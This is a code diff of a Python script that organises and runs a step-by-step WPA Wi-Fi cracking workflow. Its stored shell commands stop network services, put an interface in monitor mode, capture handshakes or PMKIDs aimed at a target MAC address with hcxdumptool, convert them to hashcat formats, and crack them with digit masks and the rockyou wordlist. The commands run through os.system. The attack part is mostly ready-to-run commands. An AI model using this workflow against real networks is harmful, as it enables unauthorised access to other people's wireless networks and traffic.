@@ -7,8 +7,7 @@ class JSONDatabase:
         self.file_path = file_path
         self.session_name = session_name
         self.interface = interface
-        self.macaddress = macaddress
-        self.macaddress = ""                    # e.g 18CF24852084
+        self.macaddress = macaddress    # e.g 18CF24852084                 
         self.channel = channel
         self.is_2GHz4 = is_2GHz4
         if not os.path.exists(self.file_path):
@@ -61,55 +60,68 @@ class JSONDatabase:
     def list_all(self):
         return self._read_db()
 
-
-    def prepare(self):  
+    # This function will create a template for the database.
+    # But the best way is to use the load_template function to load a template from a file.
+    def sync(self):  
         self.create(
             {
-                "step": 9,
-                "name": "Scan interfaces",
-                "commands": [
-                    "sudo iw dev",
-                    "iwconfig",
-                    "sudo airmon-ng",
-                    "sudo airmon-ng check kill",
-                ]
-            }
-        )  
-        self.create(
-            {
-                "step": 2,
-                "name": "Stop managing service",
-                "commands": [
-                    "sudo systemctl stop NetworkManager.service",
-                    "sudo systemctl stop wpa_supplicant.service"
-                ]
+            "step": 0,
+            "name": "Configure session",
+            "commands": [
+                "file_path",
+                "session_name",
+                "interface",
+                "macaddress",
+                "channel",
+                "is_2GHz4"
+            ]
             }
         )
         self.create(
             {
-                "step": 3,
-                "name": "Put NIC into monitor mode",
-                "commands": [
-                    f"sudo airmon-ng start {self.interface}"
-                ]
+            "step": 1,
+            "name": "Restart managing service",
+            "commands": [
+                "sudo systemctl start NetworkManager.service",
+                "sudo systemctl start wpa_supplicant.service"
+            ]
             }
         )
         self.create(
             {
-                "step": 4,
-                "name": "Scan for networks",
-                "commands": [
-                    f"sudo airodump-ng {self.interface}"
-                ]
+            "step": 2,
+            "name": "Stop managing service",
+            "commands": [
+                "sudo systemctl stop NetworkManager.service",
+                "sudo systemctl stop wpa_supplicant.service"
+            ]
             }
         )
         self.create(
             {
-                "step": 5,
-                "name": "Create a BPF filter",
-                "commands": [
-                    f"sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3 {self.macaddress} or wlan addr3 ffffffffffff' -ddd > {self.session_name}_attack.bpf"
-             ]
+            "step": 3,
+            "name": "Put NIC into monitor mode",
+            "commands": [
+                f"sudo airmon-ng start {self.interface}"
+            ]
+            }
+        )
+        self.create(
+            {
+            "step": 4,
+            "name": "Scan for networks",
+            "commands": [
+                f"sudo airodump-ng {self.interface}"
+            ]
+            }
+        )
+        self.create(
+            {
+            "step": 5,
+            "name": "Create a BPF filter",
+            "commands": [
+                f"sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3 {self.macaddress} or wlan addr3 ffffffffffff' -ddd > {self.session_name}_attack.bpf"
+            ]
             }
         )
         temp = ""
@@ -119,63 +131,83 @@ class JSONDatabase:
             temp = f"{self.channel}"
         self.create(
             {
-                "step": 6,
-                "name": "Start packet capture",
-                "commands": [
-                    f"sudo hcxdumptool -i {self.interface} -c {temp} --bpf={self.session_name}_attack.bpf -w {self.session_name}_capture.pcapng",
-                    f"sudo tcpdump -U -s 0 -i {self.interface} -w {self.session_name}_capture.pcap -l -n -e -vv -r {self.session_name}_attack.bpf"
-                ]
+            "step": 6,
+            "name": "Start packet capture",
+            "commands": [
+                f"sudo hcxdumptool -i {self.interface} -c {temp} --bpf={self.session_name}_attack.bpf -w {self.session_name}_capture.pcapng",
+                f"sudo tcpdump -U -s 0 -i {self.interface} -w {self.session_name}_capture.pcap -l -n -e -vv -r {self.session_name}_attack.bpf"
+            ]
             }
         )
         self.create(
             {
-                "step": 7,
-                "name": "Convert captured packets to hashcat format",
-                "commands": [
-                    f"sudo hcxpcaptool -o {self.session_name}_hash.hc22000 {self.session_name}_capture.pcapng"
-                    f"sudo hcxpcaptool -z {self.session_name}_hash.16800 {self.session_name}_capture.pcapng"
-                ]
+            "step": 7,
+            "name": "Convert captured packets to hashcat format",
+            "commands": [
+                f"sudo hcxpcaptool -o {self.session_name}_hash.hc22000 {self.session_name}_capture.pcapng",
+                f"sudo hcxpcaptool -z {self.session_name}_hash.16800 {self.session_name}_capture.pcapng"
+            ]
             }
         )
         self.create(
             {
-                "step": 8,
-                "name": "Crack captured hashes",
-                "commands": [
-                    f"hashcat.exe {self.session_name}_hash.hc22000 -a 3 -m 22000 -i --increment-min=8 --increment-max=12 ?d?d?d?d?d?d?d?d?d?d?d?d --session=1",
-                    f"sudo hashcat -m 22000 {self.session_name}_hash.hc22000 %d%d%d%d%d%d%d%d%d%d -a 3 --force",
-                    f"sudo hashcat -m 16800 {self.session_name}_hash.16800 /usr/share/wordlists/rockyou.txt"
-                ]
+            "step": 8,
+            "name": "Crack captured hashes",
+            "commands": [
+                f"hashcat.exe {self.session_name}_hash.hc22000 -a 3 -m 22000 -i --increment-min=8 --increment-max=12 ?d?d?d?d?d?d?d?d?d?d?d?d --session=1",
+                f"sudo hashcat -m 22000 {self.session_name}_hash.hc22000 %d%d%d%d%d%d%d%d%d%d -a 3 --force",
+                f"sudo hashcat -m 16800 {self.session_name}_hash.16800 /usr/share/wordlists/rockyou.txt"
+            ]
             }
         )
         self.create(
             {
-                "step": 1,
-                "name": "Restart managing service",
-                "commands": [
-                    "sudo systemctl start NetworkManager.service",
-                    "sudo systemctl start wpa_supplicant.service"
-                ]
+            "step": 9,
+            "name": "Scan interfaces",
+            "commands": [
+                "sudo iw dev",
+                "iwconfig",
+                "sudo airmon-ng",
+                "sudo airmon-ng check kill",
+            ]
             }
         )
         self.create(
             {
-                "step": 10,
-                "name": "Fix hcxdumptool error",
-                "commands": [
-                    "sudo apt-get update",
-                    "sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev",
-                    "git clone https://github.com/ZerBea/hcxtools.git",
-                    "cd hcxtools",
-                    "sudo make && sudo make install",
-                    "cd ..",
-                    "git clone https://github.com/Zerbea/hcxdumptool.git",
-                    "cd hcxdumptool",
-                    "sudo make && sudo make install",
-                    "which hcxdumptool"
-                ]
+            "step": 10,
+            "name": "Fix hcxdumptool error",
+            "commands": [
+                "sudo apt-get update",
+                "sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev",
+                "git clone https://github.com/ZerBea/hcxtools.git",
+                "cd hcxtools",
+                "sudo make && sudo make install",
+                "cd ..",
+                "git clone https://github.com/Zerbea/hcxdumptool.git",
+                "cd hcxdumptool",
+                "sudo make && sudo make install",
+                "which hcxdumptool"
+            ]
             }
         )
+
+    # This function will not be used for now, but it is a good example of how to create a template
+    def load_template(self, template_path):
+        if not os.path.exists(template_path):
+            raise FileNotFoundError(f"Template file {template_path} does not exist.")
+        
+        if not os.path.exists(template_path):
+            self._create_empty_db()
+        else:
+            self.flush()
+        
+        with open(template_path, 'r') as template_file:
+            template_data = json.load(template_file)
+
+        template_data.sort(key=lambda x: x['step'])
+        
+        for element in template_data:
+            self.create(element)
 
     def flush(self):
         self._create_empty_db()
@@ -197,6 +229,42 @@ class JSONDatabase:
             choice = input("Enter the step number to execute or 'q' to quit: ")
             if choice.lower() == 'q':
                 break
+            if choice == '0':
+                while True:
+                    os.system('clear' if os.name == 'posix' else 'cls')
+                    print(f"0. Session name: {self.session_name}")
+                    print(f"1. Interface: {self.interface}")
+                    print(f"2. MAC address: {self.macaddress}")
+                    print(f"3. Channel: {self.channel}")
+                    print(f"4. Is it 2.4GHz?: {self.is_2GHz4}")
+                    print("b: Back to main menu")
+                    config_choice = input("Select the element to configure: ")
+                    if config_choice == '0':
+                        self.session_name = input("Enter session name: ")
+                        self.flush()
+                        self.sync()
+                    elif config_choice == '1':
+                        self.interface = input("Enter interface: ")
+                        self.flush()
+                        self.sync()
+                    elif config_choice == '2':
+                        self.macaddress = input("Enter MAC address: ")
+                        self.flush()
+                        self.sync()
+                    elif config_choice == '3':
+                        self.channel = input("Enter channel: ")
+                        self.flush()
+                        self.sync()
+                    elif config_choice == '4':
+                        self.is_2GHz4 = input("Is it 2.4GHz? (True/False): ").lower() == 'true'
+                        self.flush()
+                        self.sync()
+                    elif config_choice.lower() == 'b':
+                        break
+                    else:
+                        print("Invalid choice.")
+                    input("Press Enter to continue...")
+                continue
             try:
                 os.system('clear' if os.name == 'posix' else 'cls')
                 step = int(choice)
@@ -222,15 +290,16 @@ class JSONDatabase:
 
 
 db = JSONDatabase(
-    file_path='config.json',
-    session_name='ssid1',
-    interface='wlanX',
+    file_path='new.json',
+    session_name='TestWiFi',
+    interface='wlan0',
     macaddress='aabbccddeeff',
     channel='1',
     is_2GHz4=True
 )
-db.flush()
-db.prepare()
-print(db.run_command("ls"))
+db.flush() # Clear the database
+db.sync() # Sync the database with the default values
+#print(db.run_command("ls"))
+#db.load_template("config.dist.json")
 db.menu_loop()
 #print(config.list_all())
